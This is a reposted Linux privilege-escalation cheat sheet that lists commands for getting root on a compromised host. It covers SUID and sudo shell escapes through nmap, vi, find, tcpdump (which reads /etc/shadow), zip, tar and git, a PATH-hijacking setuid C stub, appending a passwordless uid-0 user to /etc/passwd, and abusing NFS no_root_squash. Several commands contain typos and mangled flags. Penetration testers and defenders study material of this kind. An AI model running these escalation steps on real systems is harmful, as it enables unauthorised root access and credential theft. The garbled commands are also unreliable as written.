Original artical - https://medium.com/@liau.weijie/privilege-escalation-on-linux-platform-8b3fbd0b1dd4

Linux Pric Esc Commands

## 01 Kernel Exploit

	$ uname -a
	$ cat /etc/issue
	$ cat /etc/*-release
	$ cat /etc/lsb-release
	$ cat /etc/redhat-release
	$ lsb_release

## 02 Exploit the service running as root

For Samba 2.2.x, 
 - https://www.exploit-db.com/exploits/10

For MySQL, if there is mysql daemon running as root, you could utilize UDF (User Define Function) to get root shell.
 - https://www.exploit-db.com/exploits/1518

## 03 Find anything with SUID / SGID permission

### Finding interesting file

	$ find / -user root -perm -4000 2>/dev/null
	$ find / -perm -2000 2>/dev/null


### namp 

	$ nmap --interactive
	nmap> !sh

	Another way below (if nmap doesn’t have interactive mode):
	$ echo “os.execute(‘/bin/sh’)” > /tmp/shell.nse)
	$ sudo nmap --script=/tmp/shell.nse)

### vi

	$ vi
	:!sh

### find
	$ find / home -exec sh -i \;

### python

	$ python -c ‘import pty;pty.spawn(“/bin/sh”)’

### strace

	$ strace -o /dev/null /bin/sh


### tcpdump

	$ echo $’id\ncat /etc/shadow’ > /tmp/.shell
	$ chmod +x /tmp/.shell
	$ tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.shell -Z root


If you find out one script file with SUID permission, owned by root and executable by others, and this script file will execute some commands. You can play the trick to get root shell. For example here, this script will execute scp command transferring some backup file to somewhere. Add . into $PATH and compile setuid.c, rename the compiled binary to scp and put it under current folder. And then run that script.

	$ export PATH=.:$PATH
	$ cat setuid.c
		#include <stdio.h>
		int main(void)
		{
		setuid(0); setgid(0); seteuid(0); setegid(0); execvp(“/bin/sh”, NULL, NULL);
		}
	$ mv setuid scp
	$ ./script.sh

### abuse sudo

Use the following command to show which command have allowed to the current user.

	$ sudo -l

And if you find the following command with NOPASSWD and root set in the output. You win again !!!

### zip

    $ sudo zip /tmp/test.zip /tmp/test -T --unzip-command=”sh -c /bin/bash”

### tar

    $ sudo tar cf /dev/null testfile --checkpoint=1 — checkpointaction=exec=/bin/bash

### strace

    $ sudo strace -o/dev/null /bin/bash

### tcpdump

    $ echo $’id\ncat /etc/shadow’ > /tmp/.shell
    $ chmod +x /tmp/.shell
    $ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.shell -Z root

### nmap

    $ echo “os.execute(‘/bin/sh’)” > /tmp/shell.nse
    $ sudo nmap --script=/tmp/shell.nse

    Another way below:
    ($ sudo nmap --interactive
    nmap> !sh)

### scp

    $ sudo scp -S /path/to/your/script x y

### except

    $ sudo except spawn sh then sh

### nano

    $ sudo nano -S /bin/bash

### git

    $ sudo git help status
    : !/bin/bash

### gdb/ftp

    $ sudo ftp
    : !/bin/sh



## 05 Find any writable file owned by root

Please use the following command to find any writable files owned by root. You might be able to see the script file and add the needed command for your privilege escalation.

    $ find / -perm -002 -user root -type f -not-path “/proc/*” 2>/dev/null

## 06 Check /etc/passwd if writable

If you see /etc/passwd is writable, the only thing you should do is to echo one line to /etc/passed

    $ echo “tseruser::0:0:pawned:/root:/bin/bash” >> /etc/passwd
    $ su testuser
	
## 07 NFS root squashing

According Wikipedia, root squash is a special mapping of the remote superuser (root) identity when using identity authentication (local user is the same as remote user). Under root squash, a client’s uid 0 (root) is mapped to 65534 (nobody). It is primarily a feature of NFS but may be available on other systems as well.

In the scenario which you use showmount to find your target has NFS service up and running and you’re already in via anyway and you find you have the permission to edit /etc/exports as well, for example, you can use sudoedit to edit /etc/exports. You can put no_root_squash to disable root squash. Please see below:

    /home/userfolder *(rw,no_root_squash)

And then you can mount this folder with local root and put the copy of /bin/bash into it. After this, try use the exploited normal account to execute this /bin/bash. You will get the heaven !!!

## 08 Useful tools

	- LinEnum
	https://github.com/rebootuser/LinEnum
	
	- linuxprivchecker
	https://github.com/sleventyeleven/linuxprivchecker
	
	- unix-privesc-check
	https://github.com/pentestmonkey/unix-privesc-check
